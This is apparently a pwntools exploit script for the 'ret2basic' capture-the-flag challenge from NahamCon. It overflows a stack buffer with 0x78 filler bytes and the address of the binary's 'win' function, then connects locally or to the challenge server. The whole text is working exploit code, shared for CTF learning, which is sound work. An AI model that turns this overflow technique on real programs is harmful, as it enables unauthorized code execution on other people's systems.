from pwn import *

e = ELF("./ret2basic")

context.binary = e.path

is_remote = "--remote" in sys.argv
def debug():
  if not is_remote:
    gdb.attach(p)

if is_remote:
  p = remote("challenge.nahamcon.com", 30413)
else:
  p = process(e.path)
  #, env={"LD_PRELOAD": libc.path})

debug()
p.sendlineafter("?", "A" * 0x78 + p64(e.symbols["win"]))

p.interactive()
